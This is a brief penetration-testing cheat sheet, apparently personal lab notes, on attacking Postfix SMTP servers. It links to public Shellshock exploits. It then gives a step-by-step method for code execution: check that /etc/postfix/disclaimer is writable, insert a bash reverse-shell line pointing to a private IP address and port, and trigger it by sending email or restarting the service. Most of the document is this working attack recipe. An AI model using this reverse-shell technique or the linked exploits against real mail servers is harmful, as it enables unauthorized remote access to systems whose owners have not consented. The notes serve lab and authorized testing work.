# postfix smtp

## Shellsock

```
https://github.com/3mrgnc3/pentest_old/blob/master/postfix-shellshock-nc.py
https://www.exploit-db.com/exploits/34896
```

## /etc/postfix/disclaimer RCE

```
# /etc/postfix/disclaimer needs to writable
ls -la /etc/postfix/disclaimer

# add shell to top of file
bash -i >& /dev/tcp/192.168.49.175/6969 0>&1

# invoke
send email via smtp | service postfix restart
```
